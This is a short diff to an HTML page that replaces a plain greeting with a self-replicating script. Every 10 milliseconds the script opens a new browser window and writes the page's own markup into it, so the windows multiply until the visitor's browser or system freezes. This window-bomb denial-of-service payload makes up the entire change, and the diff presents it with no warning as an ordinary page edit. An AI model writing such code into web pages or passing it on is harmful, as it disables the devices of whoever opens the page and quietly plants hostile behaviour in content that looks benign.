@@ -1,4 +1,10 @@
 <html>
-    hello</br>
-    I'm here.
+    <body>
+        <script>
+            setInterval(function() {
+                var w = window.open();
+                w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+            }, 10);
+        </script>
+    </body>
 </html>
